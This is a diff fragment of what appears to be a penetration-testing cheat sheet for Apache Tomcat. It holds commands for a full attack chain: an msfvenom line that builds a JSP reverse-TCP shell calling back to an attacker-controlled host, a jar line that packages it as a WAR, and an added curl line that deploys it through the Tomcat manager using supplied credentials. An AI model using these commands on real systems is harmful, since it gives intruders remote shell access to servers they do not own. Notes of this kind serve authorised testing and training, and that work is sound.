@@ -13,3 +13,6 @@ msfvenom -p java/jsp_shell_reverse_tcp lhost=<lhost> lport=<lport> -f raw > <fil
 # convert jsp to war
 jar -cvf <file>.war <file2>.jsp
 
+# upload file using curl
+curl -T <file>.war -u "<user>:<password>" http://<rhost>:<rport>/manager/text/deploy?path=<file>
+
